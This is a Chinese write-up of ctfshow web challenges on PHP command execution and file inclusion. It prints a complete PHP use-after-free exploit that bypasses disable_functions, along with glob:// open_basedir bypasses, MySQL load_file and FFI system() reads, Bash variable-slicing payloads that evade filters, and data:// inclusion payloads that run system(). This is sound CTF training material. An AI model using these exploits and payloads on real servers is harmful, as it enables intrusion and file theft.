这道题一开始还以为和上一题差不多\n先进行目录查询\nc=var_export(scandir(\u0026#34;./\u0026#34;));exit(); 注意⚠️ 这道题只有权限查询的当前目录也就是./\n而无法访问到其他目录的文件，如 / 根目录\n尝试使用 scandir() 函数来扫描根目录，但由于 open_basedir 限制，这个操作被禁止了。 open_basedir 是 PHP 的一个安全配置指令，用来限制 PHP 脚本只能访问特定的目录。 当前配置只允许访问 /var/www/html/ 目录及其子目录，但不允许访问其他目录。\n原文链接：https://blog.csdn.net/Myon5/article/details/140079942\n我们可以尝试用glob协议绕过open_basedir协议\npayload:（记得删注释）\n1c=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;);// 创建一个DirectoryIterator对象，遍历根目录 2foreach($a as $f)// 遍历每个条目 3{ 4 echo($f-\u0026gt;__toString().\u0026#39; \u0026#39;);// 输出条目的名称，并添加一个空格 5} 6exit(0); // 终止脚本执行 7?\u0026gt; 或者\npayload：（记得删注释）\n1c=?\u0026gt;\u0026lt;?php $a = opendir(\u0026#34;glob:///*\u0026#34;); // 打开根目录，并将目录句柄赋值给$a 2while (($file = readdir($a)) !== false) { // 循环读取目录中的每个条目 3 echo $file . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; // 输出每个条目的名称，并添加HTML换行标签 4}; 5exit(0); // 终止脚本执行 6?\u0026gt; 我们可以发现flag0.php\n利用uaf的脚本进行命令利用uaf的脚本进行命令执行执行：\n尝试执行ls /; cat /flag0.txt命令\n1c=?\u0026gt;\u0026lt;?php 2pwn(\u0026#34;ls /;cat /flag0.txt\u0026#34;); 3 4function pwn($cmd) { 5 global $abc, $helper, $backtrace; 6 class Vuln { 7 public $a; 8 public function __destruct() { 9 global $backtrace; 10 unset($this-\u0026gt;a); 11 $backtrace = (new Exception)-\u0026gt;getTrace(); # ;) 12 if(!isset($backtrace[1][\u0026#39;args\u0026#39;])) { # PHP \u0026gt;= 7.4 13 $backtrace = debug_backtrace(); 14 } 15 } 16 } 17 18 class Helper { 19 public $a, $b, $c, $d; 20 } 21 22 function str2ptr(\u0026amp;$str, $p = 0, $s = 8) { 23 $address = 0; 24 for($j = $s-1; $j \u0026gt;= 0; $j--) { 25 $address \u0026lt;\u0026lt;= 8; 26 $address |= ord($str[$p+$j]); 27 } 28 return $address; 29 } 30 31 function ptr2str($ptr, $m = 8) { 32 $out = \u0026#34;\u0026#34;; 33 for ($i=0; $i \u0026lt; $m; $i++) { 34 $out .= sprintf(\u0026#39;%c\u0026#39;,$ptr \u0026amp; 0xff); 35 $ptr \u0026gt;\u0026gt;= 8; 36 } 37 return $out; 38 } 39 40 function write(\u0026amp;$str, $p, $v, $n = 8) { 41 $i = 0; 42 for($i = 0; $i \u0026lt; $n; $i++) { 43 $str[$p + $i] = sprintf(\u0026#39;%c\u0026#39;,$v \u0026amp; 0xff); 44 $v \u0026gt;\u0026gt;= 8; 45 } 46 } 47 48 function leak($addr, $p = 0, $s = 8) { 49 global $abc, $helper; 50 write($abc, 0x68, $addr + $p - 0x10); 51 $leak = strlen($helper-\u0026gt;a); 52 if($s != 8) { $leak %= 2 \u0026lt;\u0026lt; ($s * 8) - 1; } 53 return $leak; 54 } 55 56 function parse_elf($base) { 57 $e_type = leak($base, 0x10, 2); 58 59 $e_phoff = leak($base, 0x20); 60 $e_phentsize = leak($base, 0x36, 2); 61 $e_phnum = leak($base, 0x38, 2); 62 63 for($i = 0; $i \u0026lt; $e_phnum; $i++) { 64 $header = $base + $e_phoff + $i * $e_phentsize; 65 $p_type = leak($header, 0, 4); 66 $p_flags = leak($header, 4, 4); 67 $p_vaddr = leak($header, 0x10); 68 $p_memsz = leak($header, 0x28); 69 70 if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write 71 # handle pie 72 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; 73 $data_size = $p_memsz; 74 } else if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec 75 $text_size = $p_memsz; 76 } 77 } 78 79 if(!$data_addr || !$text_size || !$data_size) 80 return false; 81 82 return [$data_addr, $text_size, $data_size]; 83 } 84 85 function get_basic_funcs($base, $elf) { 86 list($data_addr, $text_size, $data_size) = $elf; 87 for($i = 0; $i \u0026lt; $data_size / 8; $i++) { 88 $leak = leak($data_addr, $i * 8); 89 if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { 90 $deref = leak($leak); 91 # \u0026#39;constant\u0026#39; constant check 92 if($deref != 0x746e6174736e6f63) 93 continue; 94 } else continue; 95 96 $leak = leak($data_addr, ($i + 4) * 8); 97 if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { 98 $deref = leak($leak); 99 # \u0026#39;bin2hex\u0026#39; constant check 100 if($deref != 0x786568326e6962) 101 continue; 102 } else continue; 103 104 return $data_addr + $i * 8; 105 } 106 } 107 108 function get_binary_base($binary_leak) { 109 $base = 0; 110 $start = $binary_leak \u0026amp; 0xfffffffffffff000; 111 for($i = 0; $i \u0026lt; 0x1000; $i++) { 112 $addr = $start - 0x1000 * $i; 113 $leak = leak($addr, 0, 7); 114 if($leak == 0x10102464c457f) { # ELF header 115 return $addr; 116 } 117 } 118 } 119 120 function get_system($basic_funcs) { 121 $addr = $basic_funcs; 122 do { 123 $f_entry = leak($addr); 124 $f_name = leak($f_entry, 0, 6); 125 126 if($f_name == 0x6d6574737973) { # system 127 return leak($addr + 8); 128 } 129 $addr += 0x20; 130 } while($f_entry != 0); 131 return false; 132 } 133 134 function trigger_uaf($arg) { 135 # str_shuffle prevents opcache string interning 136 $arg = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); 137 $vuln = new Vuln(); 138 $vuln-\u0026gt;a = $arg; 139 } 140 141 if(stristr(PHP_OS, \u0026#39;WIN\u0026#39;)) { 142 die(\u0026#39;This PoC is for *nix systems only.\u0026#39;); 143 } 144 145 $n_alloc = 10; # increase this value if UAF fails 146 $contiguous = []; 147 for($i = 0; $i \u0026lt; $n_alloc; $i++) 148 $contiguous[] = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); 149 150 trigger_uaf(\u0026#39;x\u0026#39;); 151 $abc = $backtrace[1][\u0026#39;args\u0026#39;][0]; 152 153 $helper = new Helper; 154 $helper-\u0026gt;b = function ($x) { }; 155 156 if(strlen($abc) == 79 || strlen($abc) == 0) { 157 die(\u0026#34;UAF failed\u0026#34;); 158 } 159 160 # leaks 161 $closure_handlers = str2ptr($abc, 0); 162 $php_heap = str2ptr($abc, 0x58); 163 $abc_addr = $php_heap - 0xc8; 164 165 # fake value 166 write($abc, 0x60, 2); 167 write($abc, 0x70, 6); 168 169 # fake reference 170 write($abc, 0x10, $abc_addr + 0x60); 171 write($abc, 0x18, 0xa); 172 173 $closure_obj = str2ptr($abc, 0x20); 174 175 $binary_leak = leak($closure_handlers, 8); 176 if(!($base = get_binary_base($binary_leak))) { 177 die(\u0026#34;Couldn\u0026#39;t determine binary base address\u0026#34;); 178 } 179 180 if(!($elf = parse_elf($base))) { 181 die(\u0026#34;Couldn\u0026#39;t parse ELF header\u0026#34;); 182 } 183 184 if(!($basic_funcs = get_basic_funcs($base, $elf))) { 185 die(\u0026#34;Couldn\u0026#39;t get basic_functions address\u0026#34;); 186 } 187 188 if(!($zif_system = get_system($basic_funcs))) { 189 die(\u0026#34;Couldn\u0026#39;t get zif_system address\u0026#34;); 190 } 191 192 # fake closure object 193 $fake_obj_offset = 0xd0; 194 for($i = 0; $i \u0026lt; 0x110; $i += 8) { 195 write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); 196 } 197 198 # pwn 199 write($abc, 0x20, $abc_addr + $fake_obj_offset); 200 write($abc, 0xd0 + 0x38, 1, 4); # internal func type 201 write($abc, 0xd0 + 0x68, $zif_system); # internal func handler 202 203 ($helper-\u0026gt;b)($cmd); 204 exit(); 205} 206?\u0026gt; 记得要转url\n所以什么是uaf呢？ （先挖个坑回头补）\nweb73 这一题和上一题的区别其实就是flag的文件改名了，我们用上一题的方法读一下文件\nc=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;);// 创建一个DirectoryIterator对象，遍历根目录 foreach($a as $f)// 遍历每个条目 { echo($f-\u0026gt;__toString().\u0026#39; \u0026#39;);// 输出条目的名称，并添加一个空格 } exit(0); // 终止脚本执行 ?\u0026gt; 可以看到一个flagc.txt文件\n这题其实已经关闭了open_basedir，所以我们也可以用之前的方法读\nvar_export(scandir(\u0026#39;/\u0026#39;));exit(); echo(implode(\u0026#39; \u0026#39;,scandir(\u0026#39;/\u0026#39;)));exit(); 读文件的话上一题的uaf方法被ban了，这题用不了\n所以我们还是用之前方法\nc=readgzfile(\u0026#39;/flagc.txt\u0026#39;);exit(); web74 这题我先用之前的方法var_export试试能不能读到目录，发现显示null，应该是open_basedir打开了\n接着用glob协议的方法读到了，flag文件名叫做flagx.txt\n先用uaf的方法试试\n发现这条路被ban掉了\n最后用\nc=readgzfile(\u0026#39;/flagx.txt\u0026#39;);exit(); 成功查到了flag\nweb75 这题要用glob查文件，用var_export查不了\n接下来是读文件\n尝试了uaf和readgzfile之类的方法都失败了\n没办法看看大佬怎么做的\n我们其实可以用到mysql的load_file方法，从而读到flag\npayload:\n1c=$conn = mysqli_connect(\u0026#34;127.0.0.1\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;ctftraining\u0026#34;); $sql = \u0026#34;select load_file(\u0026#39;/flag36.txt\u0026#39;) as a\u0026#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[\u0026#39;a\u0026#39;]; } exit(); 豆包解释一下\n数据库连接： $conn = mysqli_connect(\u0026quot;127.0.0.1\u0026quot;, \u0026quot;root\u0026quot;, \u0026quot;root\u0026quot;, \u0026quot;ctftraining\u0026quot;); 这行代码使用 MySQLi 扩展建立了一个与 MySQL 数据库的连接。它指定了数据库服务器的 IP 地址为127.0.0.1（本地主机），用户名是root，密码也是root，要连接的数据库名称是ctftraining。如果连接成功，$conn将保存这个数据库连接对象，以便后续进行数据库操作；如果连接失败，将会产生一个错误信息（不过在这段代码中没有对连接失败情况做显式处理）。 SQL 查询语句构建： $sql = \u0026quot;select load_file('/flag36.txt') as a\u0026quot;; 这里构建了一个 SQL 查询语句。load_file()是 MySQL 中的一个函数，它的作用是读取指定路径的文件内容，并以字符串的形式返回。在这个查询中，它试图读取服务器上/flag36.txt文件的内容，并给查询结果的这一列起了一个别名a。 执行查询并获取结果： $row = mysqli_query($conn, $sql); 这行代码使用已经建立好的数据库连接$conn来执行前面构建的 SQL 查询语句$sql。如果查询执行成功，$row将包含查询结果集的资源对象（可以理解为指向查询结果数据的一种引用）；如果查询失败，同样会产生一个错误信息（这里也未做显式处理）。 while($result=mysqli_fetch_array($row)){ echo $result['a']; } 这个while循环用于遍历查询结果集。mysqli_fetch_array()函数每次从结果集中获取一行数据，并以数组的形式返回。在循环内部，它通过$result['a']来获取前面查询中load_file()函数读取到的文件内容（因为在查询中给这一列起了别名a），并将其输出到屏幕上。 程序结束： exit(); 这行代码使得脚本在完成查询结果输出后立即终止执行，不再执行后续可能存在的其他代码。 也可以\n用PDO的方法来实现同样的目的\npayload:\n1c=try {$dbh = new PDO(\u0026#39;mysql:host=localhost;dbname=ctftraining\u0026#39;, \u0026#39;root\u0026#39;, 2\u0026#39;root\u0026#39;);foreach($dbh-\u0026gt;query(\u0026#39;select load_file(\u0026#34;/flag36.txt\u0026#34;)\u0026#39;) as $row) 3{echo($row[0]).\u0026#34;|\u0026#34;; }$dbh = null;}catch (PDOException $e) {echo $e- 4\u0026gt;getMessage();exit(0);}exit(0); 数据库连接建立： $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root'); 这行代码使用 PDO 创建了一个与 MySQL 数据库的连接对象 $dbh。它指定了数据库服务器的主机名为 localhost，要连接的数据库名称是 ctftraining，以及用于登录数据库的用户名 root 和密码 root。如果连接成功，后续就可以通过这个对象进行数据库相关的操作；如果连接失败，将会抛出一个 PDOException 异常。 执行查询操作： foreach($dbh-\u0026gt;query('select load_file(\u0026quot;/flag36.txt\u0026quot;)') as $row) 这里通过已建立的数据库连接对象 $dbh 执行了一个 SQL 查询语句 select load_file(\u0026quot;/flag36.txt\u0026quot;)。load_file() 是 MySQL 中的一个函数，用于读取指定路径的文件内容。这个查询语句的目的就是获取服务器上 /flag36.txt 文件的内容。 然后使用 foreach 循环来遍历查询结果集。每次循环，$row 将会获取到查询结果集中的一行数据，由于查询结果只有一列（即 load_file() 函数返回的文件内容那一列），所以可以通过 $row[0] 来获取这一列的值。 结果输出与资源释放 结果输出： echo($row[0]).\u0026quot;|\u0026quot;; 在每次遍历查询结果集的循环中，这行代码将获取到的文件内容（通过 $row[0]）输出到屏幕上，并在后面添加一个 | 作为分隔符。 数据库连接资源释放： $dbh = null; 当查询结果处理完毕后，这行代码将数据库连接对象 $dbh 设置为 null，这有助于释放与该连接相关的资源，确保系统资源的合理利用。 异常处理 捕获异常： catch (PDOException $e) {echo $e-\u0026gt;getMessage();exit(0);} 整个 try 代码块被放置在一个 try-catch 语句中。如果在尝试建立数据库连接或执行查询等操作过程中出现任何 PDOException 异常（比如数据库连接失败、查询语句语法错误等情况），异常将会被这个 catch 块捕获。 一旦捕获到异常，catch 块中的代码将会执行。这里首先通过 $e-\u0026gt;getMessage() 获取到具体的异常消息，并将其输出到屏幕上，然后使用 exit(0) 终止脚本的执行，以防止后续可能出现的错误或未定义行为。 web76 这题依旧是用glob协议查目录，得到文件名为flag36d.txt\n用上一题mysql的方法，成功查到flag\npayload:\nc=$conn = mysqli_connect(\u0026#34;127.0.0.1\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;ctftraining\u0026#34;); $sql = \u0026#34;select load_file(\u0026#39;/flag36d.txt\u0026#39;) as a\u0026#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[\u0026#39;a\u0026#39;]; } exit(); web77 用glob协议的方法查出flag文件为flag36x.php，还有一个readflag文件\n接下来要看看怎么查文件\n上两题用到的读flag的方法（mysql）这题用不了，需要想点其他的方法\n官方的wp用 PHP 中的 FFI（Foreign Function Interface）方法来调用 C 语言的 system 函数，并执行一个 Shell 命令。\n什么是FFI? PHP FFI（Foreign Function Interface）是 PHP 7.4 及以上版本引入的一个强大功能。它允许 PHP 代码直接调用 C 语言函数，从而实现了 PHP 与 C 语言的高效交互。这为 PHP 开发者提供了一种利用 C 语言的高性能和底层操作系统功能的方式。\npayload:\n$ffi = FFI::cdef(\u0026#34;int system(const char *command);\u0026#34;);//创建一个system对象 $a=\u0026#39;/readflag \u0026gt; 1.txt\u0026#39;;//没有回显的 $ffi-\u0026gt;system($a);//通过$ffi去调用system函数 通过执行目录中的 /readflag 程序并将其输出重定向到文件 1.txt中（因为只是执行的话没有回显）\n执行一下\n看到有回显应该是成功了，访问一下1.txt\n由于当前用户权限不足我们是不能直接读flag36x.php文件中的内容的，只能通过readflag（脚本里面会进行提权）来读\nweb118 原文地址：https://blog.csdn.net/Myon5/article/details/140145005\n输入数字和小写字母，回显 evil input\n查看源码，发现这里会将提交的参数 code 传给 system 函数\n使用 burpsuite 抓包进行单个字符的模糊测试 fuzz：\n发现过滤掉了数字和小写字母以及一些符号，下面框起来的部分是可用的\n结合题目提示：flag 在 flag.php\n那么我们就需要构造出命令去读取 flag.php\n我们先来了解一下 Linux 的内置变量 在 Linux 系统中，有许多内置变量（环境变量）用于配置系统行为和存储系统信息。\n（1）$BASH\n描述：指向当前使用的Bash解释器的路径。 示例：/bin/bash 用途：用于确定正在使用的Bash版本和路径。\n（2） $PATH\n描述：存储一系列路径，这些路径用于查找可执行文件，当你在命令行中输入命令时，系统会在这些路径中查找对应的可执行文件。 示例：/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 用途：影响命令的查找和执行，可以添加自定义脚本或程序的路径。\n（3）$HOME\n描述：当前用户的主目录路径。 示例：/home/username 用途：表示当前用户的主目录，通常用于存储用户配置文件和个人数据。\n（4）$PWD\n描述：当前工作目录（Present Working Directory）。 示例：/home/username/projects 用途：表示当前的工作目录路径，常用于脚本和命令中获取或显示当前目录。\n（5）$USER\n描述：当前登录的用户名。 示例：username 用途：表示当前用户的名称，常用于显示或检查用户信息。\n（6）$SHELL\n描述：当前用户的默认shell。 示例：/bin/bash 用途：表示用户登录时使用的默认shell路径。\n（7）$UID\n描述：当前用户的用户ID。 示例：1000（普通用户），0（root用户） 用途：标识当前用户的唯一ID。\n（8）$IFS\n描述：内部字段分隔符（Internal Field Separator），用于分割输入的字段，默认为空格、制表符和换行符。 示例：默认值为 用途：影响脚本中的字段分割，常用于处理输入和解析文本。\n此外还有很多的内置变量：\n接下来我们需要知道 Bash 变量的切片，与 python 的切片类似，目的还是从指定位置开始提取子字符串，用法：${VAR:offset:length}，看例子：\n${PWD:1:2} 提取从第二个字符开始的两个字符，即 ro，在 Bash 中，字符串切片的索引也是从 0 开始的。\n如果只填一个参数，会默认从指定的位置开始提取到字符串的末尾：\n${PWD:3} 简单测一下我们就可以看出波浪号的效果：从结尾开始取\n但是这里数字被过滤了，因此我们使用大写字母绕过：\n可以发现任意的大小写字母与数字 0 等效\n不难想到这里的 $PWD 应该是 /var/www/html（网页服务所在的常见路径）；\n而 $PATH 的结尾应该也是 /bin（这个在前面我们已经测试过了）。\n因此我们可以构造出 nl 命令来读取 flag.php，由于 ? 可用，因此我们可以进行通配，绕过字母的过滤，构造 payload：\n${PATH:~Q}${PWD:~Q} ????.??? 当然题目还给了其他 payload：\n${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.??? 在Bash中，${#var} 的语法用于获取变量 var 的长度（即字符数）。\n这种形式可以应用于任何变量，无论是字符串变量还是环境变量。\n我们知道 ${HOME} 是 /root，因此 ${#HOME} 就是 5。\n以此类推，最终将这些数字应用到切片中去，绕过对数字的过滤，构造出我们想要执行的命令。\nWeb119 先用上一题的payload打了一下，显示evil input\n测了一下上题用的PATH被ban了\n换个方法\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.??? 相当于/???/??t ????.??? 匹配/bin/cat ????.??? ${#SHLVL}}=1\n${PWD::${#SHLVL}} = /\n${#HOSTNAME}=4 //用户名的位数，这里用户名是root，故为4\n另一种方法\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.??? 相当于/???/?????4 ????.??? 或者 /???/?????5 ????.??? 想要匹配/bin/base64 ????.??? {#RANDOM} = 4或5\n由于可能是5，所以要多试几次，还要进行base64解码\nweb120 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u0026lt;|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; 这题把上题的HOME也ban了，但是第二种方法还能出，而且长度也符合\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.??? 或\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.??? web121 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u0026lt;|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; 这题SHLVL被ban了，可以用?代替\n${#?}=1\npayload\n${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.??? 或\n${PWD::${#?}}???${PWD::${#?}}${PWD::${#?}}?? ????.??? /bin/rev rev是倒叙输出的\nweb122 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|#|%|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; 这题把PWD和#也ban掉了\n可以考虑用$?来代替${#1}\n$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误\n所以我们可以构造payload:\n\u0026lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? \u0026lt;A指令不知道是啥，埋个坑\nweb124 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: 收集自网络 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-06 14:04:45 9 10*/ 11 12error_reporting(0); 13//听说你很喜欢数学，不知道你是否爱它胜过爱flag 14if(!isset($_GET[\u0026#39;c\u0026#39;])){ 15 show_source(__FILE__); 16}else{ 17 //例子 c=20-1 18 $content = $_GET[\u0026#39;c\u0026#39;]; 19 if (strlen($content) \u0026gt;= 80) { 20 die(\u0026#34;太长了不会算\u0026#34;); 21 } 22 $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;]; 23 foreach ($blacklist as $blackitem) { 24 if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $content)) { 25 die(\u0026#34;请不要输入奇奇怪怪的字符\u0026#34;); 26 } 27 } 28 //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp 29 $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; 30 preg_match_all(\u0026#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/\u0026#39;, $content, $used_funcs); 31 foreach ($used_funcs[0] as $func) { 32 if (!in_array($func, $whitelist)) { 33 die(\u0026#34;请不要输入奇奇怪怪的函数\u0026#34;); 34 } 35 } 36 //帮你算出答案 37 eval(\u0026#39;echo \u0026#39;.$content.\u0026#39;;\u0026#39;); 38} 这题设置了白名单和黑名单，白名单是数学函数，黑名单则是一些符号，而且有长度限制\n这题的思路其实就是要考虑用数字通过数学运算函数的转换来构造出我们需要用到的字符\n就比如我们可以先将需要的字符转换成16进制后再转换成10进制，再执行命令的时候通过数学函数转换回去\nCTFshow-WEB入门-命令执行web124 - Hacker\u0026amp;Cat - 博客园\n目标代码：$_GET[\u0026#39;abs\u0026#39;]($_GET[\u0026#39;acos\u0026#39;]) dechex()，10进制转16进制 base_convert(值,原进制,目标进制)，任意进制转换 hex2bin，16进制转字符串 解题：\nbase_convert(26941962055,10,34) 为 hex2bin\nbase_convert(26941962055,10,34)(dechex(1598506324)) 为 _GET\n构造payload\nc=$pi=base_convert(26941962055,10,34)(dechex(1598506324));$$pi{abs}($$pi{asin})\u0026amp;abs=system\u0026amp;asin=ls 文件包含 以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()\nWeb78 php伪协议\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 10:52:43 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 10:54:20 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;file\u0026#39;])){ 16 $file = $_GET[\u0026#39;file\u0026#39;]; 17 include($file); 18}else{ 19 highlight_file(__FILE__); 20} payload:\n?file=data://text/plain,\u003c?php system(\"cat flag.php\")?\u003e\n查看源代码，得到flag\nweb79 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:10:14 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 11:12:38 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;file\u0026#39;])){ 16 $file = $_GET[\u0026#39;file\u0026#39;]; 17 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} 这题相对于上一题会将file中的php替换为???\n我们可以通过base64进行绕过\n?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4= or\n?file=data://text/plain,\u0026lt;?=system(\u0026#39;tac 